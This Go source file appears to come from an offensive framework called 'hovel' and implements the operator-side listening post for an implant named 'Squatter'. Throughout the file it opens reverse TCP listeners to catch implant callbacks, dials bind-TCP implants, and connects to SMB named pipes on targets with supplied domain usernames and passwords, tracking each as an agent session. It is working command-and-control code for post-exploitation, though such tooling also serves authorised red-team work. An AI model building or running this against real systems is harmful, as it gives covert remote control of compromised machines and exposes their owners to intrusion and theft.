package main

import (
	"context"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/smbpipe"
	"github.com/Vibe-Pwners/hovel/sdk/go/hovel"
)

type listeningPost interface {
	PrepareListener(hovel.PrepareListenerRequest) (hovel.ListenerRef, error)
	ConnectSession(hovel.ConnectSessionRequest) (hovel.SessionRef, error)
	Cleanup(hovel.CleanupPayloadRequest) (hovel.CleanupResult, error)
}

type placeholderLP struct {
	mu        sync.Mutex
	listeners map[string]hovel.ListenerRef
	sessions  map[string]hovel.SessionRef
	smb       smbConnector
	smbConns  map[string]io.ReadWriteCloser
	bindConns map[string]net.Conn
	reverse   map[string]*reverseTCPListener
	callbacks map[string]reverseTCPCallback
}

type smbConnector interface {
	ConnectSMB(hovel.ConnectSessionRequest, smbConnectOptions) (io.ReadWriteCloser, error)
}

type smbConnectOptions struct {
	Host     string
	Port     int
	Domain   string
	Username string
	Password string
	Pipe     string
}

type goSMBConnector struct{}

type tcpBindOptions struct {
	Host    string
	Port    int
	Timeout time.Duration
}

type reverseTCPListener struct {
	listener net.Listener
	accepted chan reverseTCPCallback
	closed   chan struct{}
}

type reverseTCPCallback struct {
	remote string
	hello  []byte
	conn   net.Conn
}

func newPlaceholderLP() *placeholderLP {
	return &placeholderLP{
		listeners: map[string]hovel.ListenerRef{},
		sessions:  map[string]hovel.SessionRef{},
		smb:       goSMBConnector{},
		smbConns:  map[string]io.ReadWriteCloser{},
		bindConns: map[string]net.Conn{},
		reverse:   map[string]*reverseTCPListener{},
		callbacks: map[string]reverseTCPCallback{},
	}
}

func (lp *placeholderLP) PrepareListener(req hovel.PrepareListenerRequest) (hovel.ListenerRef, error) {
	if req.Target == "" {
		return hovel.ListenerRef{}, fmt.Errorf("target is required")
	}
	port := 0
	if text := req.Config["payload.lport"]; text != "" {
		parsed, err := strconv.Atoi(text)
		if err != nil {
			return hovel.ListenerRef{}, fmt.Errorf("payload.lport is not valid: %w", err)
		}
		port = parsed
	}
	host := req.Config["payload.lhost"]
	if host == "" {
		host = "127.0.0.1"
	}
	listener, err := net.Listen("tcp", net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		return hovel.ListenerRef{}, fmt.Errorf("prepare reverse TCP listener: %w", err)
	}
	if tcpAddr, ok := listener.Addr().(*net.TCPAddr); ok {
		port = tcpAddr.Port
	}

	reverse := &reverseTCPListener{
		listener: listener,
		accepted: make(chan reverseTCPCallback, 1),
		closed:   make(chan struct{}),
	}
	go reverse.acceptOne()

	ref := hovel.ListenerRef{
		ID:        "squatter-listener-" + req.Target,
		RunID:     req.RunID,
		Target:    req.Target,
		Transport: "squatter/" + tcpCallback,
		Host:      host,
		Port:      port,
		State:     "listening",
		Fields: map[string]string{
			"address": listener.Addr().String(),
		},
	}
	lp.mu.Lock()
	defer lp.mu.Unlock()
	if existing, ok := lp.reverse[req.Target]; ok {
		existing.close()
	}
	lp.listeners[req.Target] = ref
	lp.reverse[req.Target] = reverse
	return ref, nil
}

func (lp *placeholderLP) ConnectSession(req hovel.ConnectSessionRequest) (hovel.SessionRef, error) {
	if req.Target == "" {
		return hovel.SessionRef{}, fmt.Errorf("target is required")
	}
	transport := "squatter/" + smbNamedPipe
	state := "pending_post_throw_connect"
	switch canonicalTransport(req.Config["payload.transport"]) {
	case tcpCallback:
		transport = "squatter/" + tcpCallback
		state = "listening"
		if callback, ok := lp.takeReverseCallback(req.Target); ok {
			state = "open"
			lp.mu.Lock()
			lp.callbacks[req.Target] = callback
			lp.mu.Unlock()
		}
	case tcpBind:
		conn, err := lp.connectTCPBind(req)
		if err != nil {
			return hovel.SessionRef{}, err
		}
		transport = "squatter/" + tcpBind
		state = "open"
		lp.mu.Lock()
		if existing, ok := lp.bindConns[req.Target]; ok {
			_ = existing.Close()
		}
		lp.bindConns[req.Target] = conn
		lp.mu.Unlock()
	default:
		conn, err := lp.connectSMB(req)
		if err != nil {
			return hovel.SessionRef{}, err
		}
		state = "open"
		lp.mu.Lock()
		if existing, ok := lp.smbConns[req.Target]; ok {
			_ = existing.Close()
		}
		lp.smbConns[req.Target] = conn
		lp.mu.Unlock()
	}
	ref := hovel.SessionRef{
		ID:           "squatter-session-" + req.Target,
		RunID:        req.RunID,
		ModuleID:     payloadName + "@" + version,
		Target:       req.Target,
		Name:         "Squatter session",
		Kind:         "agent",
		State:        state,
		Transport:    transport,
		Capabilities: capabilities(),
	}
	lp.mu.Lock()
	defer lp.mu.Unlock()
	lp.sessions[req.Target] = ref
	return ref, nil
}

func (lp *placeholderLP) Cleanup(req hovel.CleanupPayloadRequest) (hovel.CleanupResult, error) {
	lp.mu.Lock()
	defer lp.mu.Unlock()
	if req.Target == "" {
		for _, listener := range lp.reverse {
			listener.close()
		}
		for _, callback := range lp.callbacks {
			_ = callback.conn.Close()
		}
		for _, conn := range lp.smbConns {
			_ = conn.Close()
		}
		for _, conn := range lp.bindConns {
			_ = conn.Close()
		}
		lp.listeners = map[string]hovel.ListenerRef{}
		lp.sessions = map[string]hovel.SessionRef{}
		lp.smbConns = map[string]io.ReadWriteCloser{}
		lp.bindConns = map[string]net.Conn{}
		lp.reverse = map[string]*reverseTCPListener{}
		lp.callbacks = map[string]reverseTCPCallback{}
		return hovel.CleanupResult{Status: "ok"}, nil
	}
	if listener, ok := lp.reverse[req.Target]; ok {
		listener.close()
	}
	if callback, ok := lp.callbacks[req.Target]; ok {
		_ = callback.conn.Close()
	}
	if conn, ok := lp.smbConns[req.Target]; ok {
		_ = conn.Close()
	}
	if conn, ok := lp.bindConns[req.Target]; ok {
		_ = conn.Close()
	}
	delete(lp.listeners, req.Target)
	delete(lp.sessions, req.Target)
	delete(lp.smbConns, req.Target)
	delete(lp.bindConns, req.Target)
	delete(lp.reverse, req.Target)
	delete(lp.callbacks, req.Target)
	return hovel.CleanupResult{Status: "ok"}, nil
}

func (lp *placeholderLP) connectSMB(req hovel.ConnectSessionRequest) (io.ReadWriteCloser, error) {
	connector := lp.smb
	if connector == nil {
		connector = goSMBConnector{}
	}
	opts, err := smbOptionsFromRequest(req)
	if err != nil {
		return nil, err
	}
	return connector.ConnectSMB(req, opts)
}

func smbOptionsFromRequest(req hovel.ConnectSessionRequest) (smbConnectOptions, error) {
	host := firstNonEmpty(req.Config["smb.host"], req.Config["target.host"], req.Target)
	port := 0
	if text := req.Config["smb.port"]; text != "" {
		parsed, err := strconv.Atoi(text)
		if err != nil {
			return smbConnectOptions{}, fmt.Errorf("smb.port is not valid: %w", err)
		}
		port = parsed
	}
	opts := smbConnectOptions{
		Host:     host,
		Port:     port,
		Domain:   req.Config["smb.domain"],
		Username: req.Config["smb.username"],
		Password: req.Config["smb.password"],
		Pipe:     req.Config["payload.pipe"],
	}
	if opts.Username == "" {
		return smbConnectOptions{}, fmt.Errorf("smb.username is required for Squatter SMB sessions")
	}
	if opts.Password == "" {
		return smbConnectOptions{}, fmt.Errorf("smb.password is required for Squatter SMB sessions")
	}
	return opts, nil
}

func firstNonEmpty(values ...string) string {
	for _, value := range values {
		if value != "" {
			return value
		}
	}
	return ""
}

func (goSMBConnector) ConnectSMB(req hovel.ConnectSessionRequest, opts smbConnectOptions) (io.ReadWriteCloser, error) {
	return smbpipe.Dialer{}.Dial(context.Background(), smbpipe.Options{
		Host:     opts.Host,
		Port:     opts.Port,
		Domain:   opts.Domain,
		Username: opts.Username,
		Password: opts.Password,
		Pipe:     opts.Pipe,
	})
}

func (lp *placeholderLP) connectTCPBind(req hovel.ConnectSessionRequest) (net.Conn, error) {
	opts, err := tcpBindOptionsFromRequest(req)
	if err != nil {
		return nil, err
	}
	ctx, cancel := context.WithTimeout(context.Background(), opts.Timeout)
	defer cancel()
	dialer := net.Dialer{Timeout: opts.Timeout}
	return dialer.DialContext(ctx, "tcp", net.JoinHostPort(opts.Host, strconv.Itoa(opts.Port)))
}

func tcpBindOptionsFromRequest(req hovel.ConnectSessionRequest) (tcpBindOptions, error) {
	host := firstNonEmpty(req.Config["tcp.host"], req.Config["target.host"], req.Target)
	if host == "" {
		return tcpBindOptions{}, fmt.Errorf("target.host is required for Squatter TCP bind sessions")
	}
	portText := firstNonEmpty(req.Config["payload.bind_port"], req.Config["payload.port"], req.Config["target.port"])
	if portText == "" {
		portText = "9100"
	}
	port, err := strconv.Atoi(portText)
	if err != nil || port < 1 || port > 65535 {
		return tcpBindOptions{}, fmt.Errorf("payload.bind_port must be a TCP port: %q", portText)
	}
	timeout := 10 * time.Second
	if text := req.Config["session.connect_ms"]; text != "" {
		millis, err := strconv.Atoi(text)
		if err != nil || millis < 1 {
			return tcpBindOptions{}, fmt.Errorf("session.connect_ms must be a positive integer: %q", text)
		}
		timeout = time.Duration(millis) * time.Millisecond
	}
	return tcpBindOptions{Host: host, Port: port, Timeout: timeout}, nil
}

func (lp *placeholderLP) takeReverseCallback(target string) (reverseTCPCallback, bool) {
	lp.mu.Lock()
	listener := lp.reverse[target]
	lp.mu.Unlock()
	if listener == nil {
		return reverseTCPCallback{}, false
	}

	select {
	case callback := <-listener.accepted:
		return callback, true
	case <-time.After(50 * time.Millisecond):
		return reverseTCPCallback{}, false
	}
}

func (lp *placeholderLP) listener(target string) (hovel.ListenerRef, bool) {
	lp.mu.Lock()
	defer lp.mu.Unlock()
	ref, ok := lp.listeners[target]
	return ref, ok
}

func (lp *placeholderLP) session(target string) (hovel.SessionRef, bool) {
	lp.mu.Lock()
	defer lp.mu.Unlock()
	ref, ok := lp.sessions[target]
	return ref, ok
}

func (listener *reverseTCPListener) acceptOne() {
	conn, err := listener.listener.Accept()
	if err != nil {
		return
	}

	buffer := make([]byte, 12)
	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, _ := io.ReadFull(conn, buffer)
	if n <= 0 {
		_ = conn.Close()
		return
	}

	callback := reverseTCPCallback{
		remote: conn.RemoteAddr().String(),
		hello:  buffer[:n],
		conn:   conn,
	}

	select {
	case listener.accepted <- callback:
	case <-listener.closed:
		_ = conn.Close()
	}
}

func (listener *reverseTCPListener) close() {
	select {
	case <-listener.closed:
		return
	default:
		close(listener.closed)
	}
	_ = listener.listener.Close()
	select {
	case callback := <-listener.accepted:
		_ = callback.conn.Close()
	default:
	}
}
